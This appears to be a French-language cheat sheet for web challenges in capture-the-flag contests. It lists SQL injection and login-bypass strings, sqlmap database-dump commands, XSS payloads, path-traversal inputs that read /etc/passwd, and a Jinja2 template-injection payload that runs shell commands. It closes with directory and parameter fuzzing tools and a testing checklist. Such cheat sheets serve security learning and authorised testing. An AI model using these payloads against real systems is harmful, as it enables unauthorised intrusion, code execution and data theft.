# 🌐 Fiche pratique des épreuves web en CTF

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Web-CTF.tr.md) • [🇬🇷 Ελληνικά](Web-CTF.el.md)

---

## 💉 Injection SQL

### Charges utiles élémentaires
```sql
' OR 1=1--
' OR '1'='1
" OR ""="
admin'--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
```

### SQLMap
```bash
sqlmap -u "http://url?id=1" --dbs
sqlmap -u "http://url?id=1" -D dbname --tables
sqlmap -u "http://url?id=1" -D dbname -T users --dump
```

---

## 📜 XSS (Cross-Site Scripting)

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.cookie)</script>
javascript:alert(1)
```

---

## 📁 LFI (Local File Inclusion)

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
```

---

## 🔧 SSTI (Server-Side Template Injection)

### Détection
```
{{7*7}}     → 49 (Jinja2/Twig)
${7*7}      → 49 (Freemarker)
<%= 7*7 %>  → 49 (ERB)
```

### Exécution de code à distance avec Jinja2
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

## 🔐 Contournement de l’authentification

```
admin' --
admin'/*
' OR 1=1 LIMIT 1--
Password: ' OR '1'='1
```

---

## 🍪 Cookie/JWT

> **Précision :** `eyJ...` est une valeur tronquée et non un JWT complet à décoder. Un JWT compact comporte des segments encodés en Base64url ; décoder leur contenu ne vérifie pas la signature. Les payloads LFI avec octet nul sont historiques et dépendent des versions du moteur concerné.

```bash
# Décodage d’un JWT
echo "eyJ..." | base64 -d

# Outils
jwt_tool.py token
jwt.io (online)
```

---

## 🛠️ Outils utiles

```bash
# Force brute sur les répertoires
gobuster dir -u http://url -w wordlist.txt

# Fuzzing
ffuf -u http://url/FUZZ -w wordlist.txt

# Découverte de paramètres
arjun -u http://url
```

---

## 📋 Liste de contrôle des épreuves web

```markdown
□ Examiner le code source de la page (Ctrl+U)
□ Examiner robots.txt et sitemap.xml
□ Examiner les cookies et les JWT
□ Tester les injections SQL dans les entrées
□ Tester les XSS dans les entrées
□ Tester les LFI dans les paramètres désignant des fichiers
□ Rechercher les injections de templates côté serveur (SSTI)
□ Rechercher les répertoires par force brute
□ Vérifier si le répertoire .git est exposé
```

---

**Retour aux CTF :** [🏁 Vue d’ensemble des CTF](./README.fr.md)
